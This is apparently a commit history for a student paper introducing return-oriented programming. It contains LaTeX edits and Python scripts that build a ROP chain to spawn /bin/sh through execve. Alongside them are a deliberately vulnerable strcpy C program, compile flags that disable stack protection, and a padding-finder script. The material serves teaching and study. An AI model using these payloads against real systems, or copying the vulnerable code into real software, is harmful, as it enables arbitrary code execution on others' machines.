-Arithmetic operations like add, sub, inc, xor, or, and can be useful to bring registers into our desired state.
+Arithmetic operations like \Verb+add+, \Verb+sub+, \Verb+inc+, \Verb+xor+, \Verb+or+, and can be useful to bring registers into our desired state.
 For that we search for the corresponding gadget with the required operands.
-For example xor can be used to clear a register or copy its contents.
+For example \Verb+xor+ can be used to clear a register or copy its contents.
 It often occurs in the following forms: \Verb+xor eax, eax+ or \Verb+xor eax, edx+.
-The first case clears the register since xor computes an anti equivalence, formally $a \oplus a = 0$ and the second one copies the value of the 2nd operand into the 1st operand when the target register is \Verb+0x00+ since \Verb+0x00+ is the neutral element of the xor operation, formally $a \oplus 0 = a$.
-\paragraph{int}
-Int stand for a system interrupt which causes a system call to be executed.
-System calls are kernelspace programs that require higher privileges than what is available in a userspace program.
+The first case clears the register since \Verb+xor+ computes a non-equivalence, formally $a \oplus a = 0$ and the second one copies the value of the 2nd operand into the 1st operand when the target register is \Verb+0x00+ since \Verb+0x00+ is the neutral element of the \Verb+xor+ operation, formally $a \oplus 0 = a$.
+\paragraph{int 0x80}
+\Verb+int+ stand for an interrupt, the interrupt \Verb+0x80+ causes a system call to be executed.
+System calls are kernelspace programs/operations that require higher privileges than what is available in a userspace program.
 Examples for system calls include io and \Verb+execve+ which allows to execute arbitary programs.
-In combination with pop, mov and other instructions we can specify the concrete system call.
-One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files.
+In combination with \Verb+pop+, \Verb+mov+ and other instructions we can specify the concrete system call.
+One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
 \subsection{Filtering the gadgets}
@@
 
+\section{Theory}
+\subsection{Stack}
+\subsection{ROP Chain}
 \section{Attack}

### 2023-02-15 pack.py

@@ -1,4 +1,4 @@
 from struct import pack
-p = 'AAAABBBBCCCC'
-p += str(pack('<I', 0x0802840)
-print(p)
+p = bytes('AAAAAAAABBBB', 'ascii')
+p += pack('<I', 0x0802840)
+print(str(p)[2:-1])

### 2023-02-15 payload.py

@@ -1,37 +1,36 @@
 from struct import pack
 import os
-data = 0x080e3020
-xor_eax_eax = 0x0804e234 # xor eax, eax ; ret
-pop_eax = 0x080ac96a # pop eax ; ret
+data = 0x080e5010
+xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
+pop_eax = 0x080ac76a # pop eax ; ret
 pop_ebx = 0x08049022 # pop ebx ; ret
-pop_ecx = 0x0807f9a3 # pop ecx ; ret
-pop_edx = 0x0807f133 # pop edx ; and eax, 0xe850fffd ; ret
-inc_eax = 0x0809fc6e # inc eax ; ret
-int_80 = 0x080499c2 # int 0x80
-mov_edx_eax = 0x0804eed2 # mov dword ptr [edx], eax ; ret
+pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
+pop_edx = 0x08051836 # pop edx ; add al, 0x31 ; ror byte ptr [ecx - 0x76e7dba4], cl ; ret
+inc_eax = 0x0809d0ae # inc eax ; ret
+int_80 = 0x080499b2 # int 0x80
+mov_ecx_eax = 0x0806cf2d # mov dword ptr [ecx], eax ; pop ebx ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAAAAAABBBB', 'ascii')
+p = bytes('AAAAAAAA', 'ascii')
  
-p += pack('<I', pop_edx) # write address of .data into edx
+p += pack('<I', pop_ecx) # write address of .data into edx
 p += pack('<I', data)
 p += pack('<I', pop_eax) # write /bin into eax
 p += bytes('/bin', 'ascii')
-p += pack('<I', mov_edx_eax) # mov to .data
-p += pack('<I', pop_edx) # address of .data + 4 into edx
+p += pack('<I', mov_ecx_eax) # mov to .data
+p += pack('<I', filler)
+p += pack('<I', pop_ecx) # address of .data + 4 into edx
 p += pack('<I', data + 4)
 p += pack('<I', pop_eax) # //sh into eax
 p += bytes('//sh', 'ascii')
-p += pack('<I', mov_edx_eax) # mov to .data
-p += pack('<I', pop_edx) # address of .data + 8 into edx
+p += pack('<I', mov_ecx_eax) # mov to .data
+p += pack('<I', filler)
[…]

### 2023-02-15 vuln_args.c

@@ -1,12 +1,0 @@
-#include <stdio.h>
-#include <string.h>
-
-int main(int argc, char *argv[]) {
-  char buffer[8] = {0};
-  if (argc != 2) {
-    printf("A single argument is required.\n");
-    return 1;
-  }
-  strcpy(buffer, argv[1]);
-  return 0;
-}

### 2023-02-15 compilation.sh
changes

@@ -1,1 +1,1 @@
-gcc -o vuln -g -m32 -D_FORTIFY_SOURCE=0 -fno-pie -fno-stack-protector -static vuln.c
+clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static

### 2023-02-15 compilation.sh
changes

@@ -1,1 +1,1 @@
-clang -o vuln vuln.c -m32 -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
+clang -o vuln vuln.c -m32 -g -fno-stack-protector -fno-pie -static

### 2023-02-15 payload.py

@@ -1,37 +1,40 @@
 from struct import pack
 import os
-data = 0x080e5010
-xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
-pop_eax = 0x080ac76a # pop eax ; ret
+data = 0x080e5020
+xor_eax_eax = 0x080509f8 # xor eax, eax ; ret
+pop_eax = 0x080ac75a # pop eax ; ret
 pop_ebx = 0x08049022 # pop ebx ; ret
-pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
-pop_edx = 0x08051836 # pop edx ; add al, 0x31 ; ror byte ptr [ecx - 0x76e7dba4], cl ; ret
-inc_eax = 0x0809d0ae # inc eax ; ret
-int_80 = 0x080499b2 # int 0x80
-mov_ecx_eax = 0x0806cf2d # mov dword ptr [ecx], eax ; pop ebx ; ret
+pop_ecx = 0x08054f4b # pop ecx ; add al, 0xf6 ; ret
+pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
+inc_eax = 0x0809d09e # inc eax ; ret
+int_80 = 0x080499a2 # int 0x80
+mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAAAAAA', 'ascii')
+p = bytes('AAAAAAAAAAAAAAAABBBB', 'ascii')
  
-p += pack('<I', pop_ecx) # write address of .data into edx
+p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
+p += pack('<I', filler)
 p += pack('<I', pop_eax) # write /bin into eax
 p += bytes('/bin', 'ascii')
-p += pack('<I', mov_ecx_eax) # mov to .data
-p += pack('<I', filler)
-p += pack('<I', pop_ecx) # address of .data + 4 into edx
+p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', pop_edx) # address of .data + 4 into edx
 p += pack('<I', data + 4)
+p += pack('<I', filler)
 p += pack('<I', pop_eax) # //sh into eax
 p += bytes('//sh', 'ascii')
-p += pack('<I', mov_ecx_eax) # mov to .data
-p += pack('<I', filler)
-p += pack('<I', pop_ecx) # address of .data + 8 into edx
[…]

### 2023-02-15 payload.py
changes

@@ -9,9 +9,10 @@ pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
 inc_eax = 0x0809d09e # inc eax ; ret
 int_80 = 0x080499a2 # int 0x80
 mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
+xor_edx_edx = 0x0807b169 # xor edx, edx ; mov eax, edx ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAAAAAAAAAAAAAABBBB', 'ascii')
+p = bytes('AAAAAAAAAAAABBBB', 'ascii')
  
 p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
@@ -32,9 +33,7 @@ p += pack('<I', xor_eax_eax) # clear eax
 p += pack('<I', mov_edx_eax) # write null after /bin/sh
 p += pack('<I', pop_ecx) # write arguments into ecx
 p += pack('<I', data + 8)
-p += pack('<I', pop_edx) # write arguments into ecx
-p += pack('<I', data + 8)
-p += pack('<I', filler)
+p += pack('<I', xor_edx_edx) # write arguments into ecx
 p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
 p += pack('<I', inc_eax)
 p += pack('<I', inc_eax)

### 2023-02-15 payload.py
changes

@@ -31,9 +31,11 @@ p += pack('<I', data + 8)
 p += pack('<I', filler)
 p += pack('<I', xor_eax_eax) # clear eax
 p += pack('<I', mov_edx_eax) # write null after /bin/sh
+p += pack('<I', pop_ebx)
+p += pack('<I', data)
 p += pack('<I', pop_ecx) # write arguments into ecx
 p += pack('<I', data + 8)
-p += pack('<I', xor_edx_edx) # write arguments into ecx
+p += pack('<I', xor_edx_edx) # clear edx
 p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
 p += pack('<I', inc_eax)
 p += pack('<I', inc_eax)

### 2023-02-15 paper.tex
changes

@@
 \usepackage{tabularx}
+\usepackage{graphicx}
+\usepackage{xcolor}
 \usepackage{url}
@@
 \subsection{Stack}
+\begin{figure}[h]
+  \centering
+  \includegraphics[width=0.65\textwidth]{stackropoffsec.png}
+  \caption{The stack when injecting the payload}
+  \label{fig:mesh1}
+\end{figure}
 \subsection{ROP Chain}
+
 \section{Attack}
+\label{sec:attack}
 \subsection{Target Program}
@@
 \section{Results}
-
+\paragraph{Attack}
+After injecting the generated payload from \cref{sec:attack} as a command line argument the program opened a shell from which we can use privilege escalation techniques in order to completely compromise the system.
+The only compiler options that had to be activated were PIE and stack canaries.
+It is likely that there are systems still in use today which are vulnerable to this kind of attack.
+Since it allows almost arbitrary code execution it is very important to identify these devices and patch or replace them.
+\paragraph{ASLR}
+The information about wether or not ROP can be applied to systems with ASLR enabled is inconsistent.
+In the run with PIE and stack canaries disabled the attack still worked even with \Verb+/proc/sys/kernel/randomize_va_space+ set to \Verb+2+, meaning full randomization of the different segments like header, libraries and stack.
+This is probably
 \section{Protection}
+Luckily we had to disable several security mechanisms to make this attack possible, especially
 
 \section{Discussion}
-
+Sources:
+https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
 %%%% 8. BILBIOGRAPHY %%%%
@@
 %   If possible, take them from DBLP.
-
 \end{document}

### 2023-02-16 paper.tex
changes

@@
 \paragraph{Introduction}
-Gadgets are code segments that sit before a \Verb+ret+ instruction, that is an instruction that uses the address on the stack to return to a previous stack frame and therefor a previous level in the call hierarchy.
-This means we can arbitrarily chain these gadgets and achieve arbitary code execution if we find gadgets for our purpose.
+On the x86 architecture the \Verb+ret+ instruction is defined to pop the return instruction pointer from the stack into the \Verb+eip+ register and redirect code execution to that memory address.
+By chaining addresses of instructions that end on a return and injecting them
+Gadgets are code segments that sit before a \Verb+ret+ instruction, these assembly instructions can be chained arbitrarily
 
@@
 The instructions before then represent the code we can use, for that we need the address of the gadget.
-We could do this manually using tools like \Verb+objdump+, \Verb+hexdump+ or use one of the many tools available, to name a few there is \Verb+ropper+, \Verb+ROPgadget+ and \Verb+pwntools+.
+It is possible this manually using tools like \Verb+objdump+, \Verb+hexdump+ or use one of the many tools available, to name a few there is \Verb+ropper+, \Verb+ROPgadget+ and \Verb+pwntools+.
 For this paper i will be using \Verb+ROPgadget+ since i found it easy to use and fast.
-Using the following command~\cref{dumpallgadgets} under Linux we can dump all gadgets to a file and search in it using regular expressions, \Verb+ROPgadget+ can be found in most package managers or can be downloaded directly from \url{https://github.com/JonathanSalwan/ROPgadget}.
-\paragraph{Finding gadgets using ROPgadget}
-\bltCommand{ropcommand.sh}{Dumping all gadgets into a file}{dumpallgadgets}
-Using this command produces an output with results similar to this.
+\Verb+ROPgadget+ can be found in most package managers or can be downloaded directly from \url{https://github.com/JonathanSalwan/ROPgadget}.
+The gadgets can be extracted from the file using the following command~\cref{dumpallgadgets}.
+We can then use regular expressions to search for the gadgets that we need.
+\bltCommand{ropcommand.sh}{Exporting gadgets with ROPgadget}{dumpallgadgets}
+This command produces an output with results similar to this.
 \bltResult{dumppick}{Output of ROPgadget}{outputropgadget}
@@
 It is clearly visible that many candidates for ROP can be found, even in a file with a relatively small size of 72 kB.
-Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or use a fixed return address.
+Though most of these gadgets are not all that useful because they often modify a lot of registers, possibly messing up the desired state or they use a fixed return address.
 In most cases we can find suitable candidates using regular expressions though, this will be demonstrated later in this section.
@@
 \paragraph{pop}
-Pop allows us to write arbitrary values into registers.
-For that we search for a \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value after the address of the pop instruction.
+\Verb+pop+ allows us to write arbitrary values into registers.
+For that we search for a \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value that we want to insert after the address of the \Verb+pop+ instruction.
 If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
-If for example we want to write some value into ecx we could use something like this: \Verb+xor ecx, ecx ; pop eax ; xor ecx, eax+.
+For example if we want to modify \Verb+ecx+ but do not have a \Verb+pop ecx+ instruction available we could achieve it with something like this: \Verb+xor ecx, ecx ; pop eax ; xor ecx, eax+.
 Provided that we have these gadgets available.
 \paragraph{mov}
-Mov allows us to write arbitrary values into memory.
-For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations, we could use something like this to accomplish that: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
+\Verb+mov+ allows us to write arbitrary values into memory.
+For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations.
+The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
 \paragraph{arithmetics, boolean algebra}
@@
 One of the most powerful system calls for blackhats is bash since it allows permanently implementing malware or gain insight into files, it can be called with the argument \Verb+/bin/sh+.
+This will be demonstrated in~\cref{sec:attack}
 \subsection{Filtering the gadgets}
@@
 The following table describes what regex we can use to find the gadgets needed for the attack.
-
 \begin{itemize}
-\item pop edx  $\rightarrow$ \bltRegex{\^{}.\{0,20\}pop edx.\{0,20\}ret\\n}
-
-\item int 0x80  $\rightarrow$ \bltRegex{\^{}.\{0,20\}int 0x80}
-
-\item xor eax, eax  $\rightarrow$ \bltRegex{\^{}.\{0,20\}xor eax, eax.\{0,20\}ret\\n} 
+\item pop edx  $\rightarrow$ \bltRegex{\^{}.\{0,20\}pop edx.\{0,20\}ret\textbackslash{}n}
+\item int 0x80  $\rightarrow$ \bltRegex{\^{}.\{0,20\}int 0x80\textbackslash{}n} 
+\item xor eax, eax  $\rightarrow$ \bltRegex{\^{}.\{0,20\}xor eax, eax.\{0,20\}ret\textbackslash{}n} 
 \end{itemize}
-
 for all of these regular expressions i was able to find at least a few suitable candidates.
@@
 \bltCode{vuln.c}{c}{The Target Program}{thetargetprogram}
-
 \paragraph{Compilation}
-We use the following command to compile the target program
+We compile the target program with the following command.
+There are several important options given in this command.
+Most importantly the \Verb+-fno-stack-protector+ option disables stack canaries which would otherwise directly terminate the program when the canary is overwritten.
+The \Verb+-m32+ option compiles the binary as a 32 Bit executable, this makes the attack easier.
+The \Verb+-static+ option makes the binary statically linked.
+Without this option there are only 50 gadgets available, considering most of them are not useful for our attack it is practically impossible to perform the attack with just these gadgets.
+The \Verb+-static+ option includes the \Verb+libc+ library in the executable, increasing the gadget count to over 8000.
+However, it is possible to determine the address of the dynamically linked library at runtime and adding an offset for each gadget to this address.
+This has been described by Saif El-Sherei but will not be further discussed in this paper.
 \bltCommand{compilation.sh}{The compliation command}{thecompilationcommand}
-
 \subsection{Phases of developing the attack}
@@
 \end{enumerate}
-
 \paragraph{Goal and abstract payload}
@@
 After extracting the gadgets using one of the above mentioned methods we can search for gadgets
-
-As described above you should
-
 \paragraph{struct.pack}
@@
 \bltCode{pack.py}{python}{How to use struct.pack}{howtopack}
+
 \section{Results}
@@
 In the run with PIE and stack canaries disabled the attack still worked even with \Verb+/proc/sys/kernel/randomize_va_space+ set to \Verb+2+, meaning full randomization of the different segments like header, libraries and stack.
-This is probably
+This is probably due to PIE
+
 \section{Protection}
@@
 Sources:
-https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf
+\url{https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf}
+\url{https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html}
 %%%% 8. BILBIOGRAPHY %%%%

### 2023-02-16 compilation.sh

@@ -1,1 +1,1 @@
-clang -o vuln vuln.c -m32 -g -fno-stack-protector -fno-pie -static
+clang -o vuln vuln.c -m32 -g -fno-stack-protector -static

### 2023-02-16 payload_debug.py

@@ -1,18 +1,18 @@
 from struct import pack
 import os
 data = 0x080e5020
-xor_eax_eax = 0x08050a08 # xor eax, eax ; ret
-pop_eax = 0x080ac76a # pop eax ; ret
+xor_eax_eax = 0x080509f8 # xor eax, eax ; ret
+pop_eax = 0x080ac75a # pop eax ; ret
 pop_ebx = 0x08049022 # pop ebx ; ret
-pop_ecx = 0x08054f5b # pop ecx ; add al, 0xf6 ; ret
-pop_edx = 0x0808b285 # pop edx ; xor eax, eax ; pop edi ; ret
-inc_eax = 0x0809d0ae # inc eax ; ret
-int_80 = 0x080499b2 # int 0x80
-mov_edx_eax = 0x08080742 # mov dword ptr [edx], eax ; ret
-xor_edx_edx = 0x0807b179 # xor edx, edx ; mov eax, edx ; ret
+pop_ecx = 0x08054f4b # pop ecx ; add al, 0xf6 ; ret
+pop_edx = 0x0808b275 # pop edx ; xor eax, eax ; pop edi ; ret
+inc_eax = 0x0809d09e # inc eax ; ret
+int_80 = 0x080499a2 # int 0x80
+mov_edx_eax = 0x08080732 # mov dword ptr [edx], eax ; ret
+xor_edx_edx = 0x0807b169 # xor edx, edx ; mov eax, edx ; ret
 filler = 0x11111111
 # Padding goes here
-p = bytes('AAAA' * 4 + 'BBBB' * 1, 'ascii')
+p = bytes('AAAAAAAAAAAAAAAABBBB', 'ascii')
  
 p += pack('<I', pop_edx) # write address of .data into edx
 p += pack('<I', data)
@@ -50,5 +50,5 @@ p += pack('<I', inc_eax)
 p += pack('<I', inc_eax)
 p += pack('<I', int_80) # call interrupt
 print(str(p)[2:-1])
-with open('payload', 'wb') as file:
+with open('payload_debug', 'wb') as file:
     file.write(p)

### 2023-02-16 paper.tex
changes

@@
 %%%% 1. DOCUMENTCLASS %%%%
-\documentclass[journal=tosc,submission]{iacrtrans}
+\documentclass[journal=tosc,submission, notanonymous]{iacrtrans}
 %%%% NOTES:
@@
 %%%% 3. AUTHOR, INSTITUTE %%%%
-\author{Maximilian Heim}
+\author{Maximilian Heim\inst{1}}
 \institute{
@@
 %%%% 4. TITLE %%%%
-\title{Return Oriented Programming}
+\title{An Introduction to Return Oriented Programming}
 %%%% NOTES:
@@
 If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
-For example if we want to modify \Verb+ecx+ but do not have a \Verb+pop ecx+ instruction available we could achieve it with something like this: \Verb+xor ecx, ecx ; pop eax ; xor ecx, eax+.
+For example if we want to modify \Verb+ecx+ but do not have a \Verb+pop ecx+ instruction available we could achieve it with something like this: \bltInlineVerb{xor ecx, ecx ; pop eax ; xor ecx, eax}.
 Provided that we have these gadgets available.
@@
 For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations.
-The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \Verb+pop ecx ; pop eax ; mov dword ptr [eax], ecx+
+The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \bltInlineVerb{pop ecx ; pop eax ; mov dword ptr [eax], ecx}
 \paragraph{arithmetics, boolean algebra}
@@
 For example \Verb+xor+ can be used to clear a register or copy its contents.
-It often occurs in the following forms: \Verb+xor eax, eax+ or \Verb+xor eax, edx+.
+It often occurs in the following forms: \bltInlineVerb{xor eax, eax} or \bltInlineVerb{xor eax, edx}.
 The first case clears the register since \Verb+xor+ computes a non-equivalence, formally $a \oplus a = 0$ and the second one copies the value of the 2nd operand into the 1st operand when the target register is \Verb+0x00+ since \Verb+0x00+ is the neutral element of the \Verb+xor+ operation, formally $a \oplus 0 = a$.
@@
 There are several important options given in this command.
-Most importantly the \Verb+-fno-stack-protector+ option disables stack canaries which would otherwise directly terminate the program when the canary is overwritten.
+Most importantly the \bltInlineVerb{-fno-stack-protector} option disables stack canaries which would otherwise directly terminate the program when the canary is overwritten.
 The \Verb+-m32+ option compiles the binary as a 32 Bit executable, this makes the attack easier.
@@
 However, it is possible to determine the address of the dynamically linked library at runtime and adding an offset for each gadget to this address.
-This has been described by Saif El-Sherei but will not be further discussed in this paper.
+This has been described by Saif El-Sherei~\cite{el-sherei} but will not be further discussed in this paper
 \bltCommand{compilation.sh}{The compliation command}{thecompilationcommand}
@@
 Sources:
-\url{https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf}
-\url{https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html}
+
+\bltInlineVerb{https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf}
+\bltInlineVerb{https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html}
 %%%% 8. BILBIOGRAPHY %%%%

### 2023-02-16 paper.tex
changes

@@
 \paragraph{How to find Gadgets}
+\label{par:ropgadget}
 A gadget can be found by searching for \Verb+0xC3+ Bytes in the program.
@@
 \subsection{Stack}
+The following graphic is an illustration of how the stack changes when injecting the payload.
+The buffer first has to be filled.
+In binary exploitation the letter \Verb+A+ is used for that most of the time, it has an easy to identify hexadecimal value of \bltInlineVerb{0x41}.
+It is important to note that without any special compiler options the stack will be aligned in \bltInlineVerb{dword}'s, because of that the buffer has to be filled with 16 Bytes instead of 8 Bytes, this can be turned off with the option \bltInlineVerb{-mpreferred-stack-boundary=2}.
+Though, then the payload only worked when filling the buffer with 24 Bytes.
 \begin{figure}[h]
@@
 \begin{enumerate}
-  \item Specify concrete goal with required program state and instructions
-  \item Generate desired list of instructions and arguments (abstract payload)
-  \item Extract gadgets using tools
+  \item Specify goal with required program state and instructions
+  \item Generate desired list of instructions and arguments (abstract payload/rop chain)
+  \item Extract gadgets using tools, e.g. ROPgadget~\cref{par:ropgadget}
   \item Search gadgets for instructions
@@
 \bibliographystyle{alpha}
-\bibliography{abbrev3,crypto,biblio}
+\bibliography{refs}
 %%%% NOTES

### 2023-02-16 payload_stack2.py

@@ -1,0 +1,54 @@
+from struct import pack
+import os
+data = 0x080e5020
+xor_eax_eax = 0x08050a28 # xor eax, eax ; ret
+pop_eax = 0x080ac78a # pop eax ; ret
+pop_ebx = 0x08049022 # pop ebx ; ret
+pop_ecx = 0x08054f7b # pop ecx ; add al, 0xf6 ; ret
+pop_edx = 0x0808b2a5 # pop edx ; xor eax, eax ; pop edi ; ret
+inc_eax = 0x0809d0ce # inc eax ; ret
+int_80 = 0x080499d2 # int 0x80
+mov_edx_eax = 0x08080762 # mov dword ptr [edx], eax ; ret
+xor_edx_edx = 0x0807b199 # xor edx, edx ; mov eax, edx ; ret
+filler = 0x11111111
+# Padding goes here
+p = bytes('AAAA' * 6 + 'BBBB' * 1, 'ascii')
+ 
+p += pack('<I', pop_edx) # write address of .data into edx
+p += pack('<I', data)
+p += pack('<I', filler)
+p += pack('<I', pop_eax) # write /bin into eax
+p += bytes('/bin', 'ascii')
+p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', pop_edx) # address of .data + 4 into edx
+p += pack('<I', data + 4)
+p += pack('<I', filler)
+p += pack('<I', pop_eax) # //sh into eax
+p += bytes('//sh', 'ascii')
+p += pack('<I', mov_edx_eax) # mov to .data
+p += pack('<I', pop_edx) # address of .data + 8 into edx
+p += pack('<I', data + 8)
+p += pack('<I', filler)
+p += pack('<I', xor_eax_eax) # clear eax
+p += pack('<I', mov_edx_eax) # write null after /bin/sh
+p += pack('<I', pop_ebx)
+p += pack('<I', data)
+p += pack('<I', pop_ecx) # write arguments into ecx
+p += pack('<I', data + 8)
+p += pack('<I', xor_edx_edx) # clear edx
+p += pack('<I', xor_eax_eax) # set eax to 11 (execve)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
+p += pack('<I', inc_eax)
[…]

### 2023-02-16 paper.tex
changes

@@
   \item Search gadgets for instructions
+  \item Determine how many bytes are needed to override the base pointer \Verb+ebp+
+  \item Determine position of a writable data segment
   \item Generate payload using the gadgets according to the the abstract payload while making sure gadgets dont interfere with our desired program state.
 This step can be done using Python which we will show in a later section~\cref{howtopack}
-  \item Insert payload into target
+  \item Insert payload into target using a vulnerability
 \end{enumerate}
@@
 After specifying the goal and possibly simplifying it we have to write a list of instructions and arguments that achieve the goal, for this its favorable to directly use the format of the final payload except for using instructions instead of addresses as this will then allow to simply insert the found gadgets into this abstract payload.
+For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
+The following program state has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.
+
 \paragraph{Extract and search gadgets}

### 2023-02-16 paper.tex
changes

@@
 For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
-The following program state has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.
-
+The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.
+\begin{figure}[h]
+  \centering
+  \includegraphics[width=0.95\textwidth]{Stateforexecve.png}
+  \caption{Required program state for the execve syscall}
+  \label{fig:stateforint}
+\end{figure}
 \paragraph{Extract and search gadgets}
-After extracting the gadgets using one of the above mentioned methods we can search for gadgets
+\paragraph{Determining the padding}
+Compilers optimize stack alignment and without providing options to change that the simplest way to determine the padding required is to test the program until it crashes with a payload increasing by 1 word in each iteration.
+This can be automated in a Python script~\cref{code:determinewordcount}.
+This script applies the method mentioned above with the \bltInlineVerb{os.system} function.
+The return value of that function is the exit code of the program that has been executed and is either \Verb+0+ when the execution ended without any errors and non \Verb+0+ when an error or exception occured during startup or runtime.
+This means we can increase the input by \bltInlineVerb{"AAAA"} in each iteration until the return value is non zero.
+At this point the base pointer \bltInlineVerb{ebp} has been overridden causing the program to crash.
+Now reducing the padding by 1 word results in the correct amount.
+\bltCode{determinewordcount.py}{python}{A Python Script to Determine the Required Words}{code:determinewordcount}
+we have overwritten the return instruction pointer with \bltInlineVerb{"BBBB"}.
+Reducing the amount of \Verb+A+'s by 4 the first gadget overrides the return address of the function call and on \Verb+ret+ the execution gets redirected to the first gadget.
 \paragraph{struct.pack}

### 2023-02-16 determinewordcount.py

@@ -1,0 +1,13 @@
+import os
+import sys
+
+def determine_word_count(target_program_path: str, buffer_size: int) -> int:
+    for words in range(1, buffer_size + 64):
+        if os.system(target_program_path + ' ' + 'AAAA' * words):
+            return words - 1
+    return -1
+    
+if __name__ == '__main__':
+    word_count = determine_word_count(sys.argv[1], int(sys.argv[2]))
+    print('Required words: ' + str(word_count))
+    print('String: ' + 'AAAA' * word_count)

### 2023-02-16 paper.tex
changes

@@
   \centering
-  \includegraphics[width=0.65\textwidth]{stackropoffsec.png}
+  \includegraphics[width=0.79\textwidth]{stackropoffsec.png}
   \caption{The stack when injecting the payload}
@@
 For the example in this paper we want to open a shell, for that the simplest way is to execute an execve system call.
-The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.
+The following program state~\cref{fig:stateforint} has to be achieved so the interrupt \bltInlineVerb{int 0x80} causes a shell to be opened.~\cite{pixis}
 \begin{figure}[h]
   \centering
-  \includegraphics[width=0.95\textwidth]{Stateforexecve.png}
-  \caption{Required program state for the execve syscall}
+  \includegraphics[width=0.95\textwidth]{requirementstackmemory.png}
+  \caption{Required Program State for the execve Syscall}
   \label{fig:stateforint}
@@
 \paragraph{Extract and search gadgets}
-\paragraph{Determining the padding}
+\paragraph{Determine the padding}
 Compilers optimize stack alignment and without providing options to change that the simplest way to determine the padding required is to test the program until it crashes with a payload increasing by 1 word in each iteration.
@@
 \bltCode{determinewordcount.py}{python}{A Python Script to Determine the Required Words}{code:determinewordcount}
-we have overwritten the return instruction pointer with \bltInlineVerb{"BBBB"}.
-Reducing the amount of \Verb+A+'s by 4 the first gadget overrides the return address of the function call and on \Verb+ret+ the execution gets redirected to the first gadget.
+\paragraph{Determine the address of a writable segment}
+There segments in a binary can be read only or writable.
+It is possible to determine wether a segment is read only with \bltInlineVerb{objdump -h}.
+However, the following~\cref{command:finddatasegment} bash command can be used to find the address of the data segment.
+\bltCommand{objdump.sh}{Determine the Address of .data}{command:finddatasegment}
 \paragraph{struct.pack}

### 2023-02-16 objdump.sh

@@ -1,0 +1,1 @@
+objdump -h ./vuln | grep "\\.data "

### 2023-02-16 paper.tex
changes

@@
 \Verb+pop+ allows us to write arbitrary values into registers.
-For that we search for a \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value that we want to insert after the address of the \Verb+pop+ instruction.
-If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
+For that we search for a \Verb+pop <reg>+ instruction inside our gadgets, in the payload we can then place the value that we want to insert after the address of the \Verb+pop+ instruction.~\cite{ropsla} If we can not find a suitable gadget we can try to get creative and achieve the desired state another way.
 For example if we want to modify \Verb+ecx+ but do not have a \Verb+pop ecx+ instruction available we could achieve it with something like this: \bltInlineVerb{xor ecx, ecx ; pop eax ; xor ecx, eax}.
@@
 \Verb+mov+ allows us to write arbitrary values into memory.
-For that we search for a \Verb+mov dword ptr [<reg1>], <reg2>+ instruction inside our gadgets, we can then, in combination with two pops write arbitrary values at arbitary memory locations.
-The following example writes the value in \Verb+ecx+ to where \Verb+eax+ points to: \bltInlineVerb{pop ecx ; pop eax ; mov dword ptr [eax], ecx}
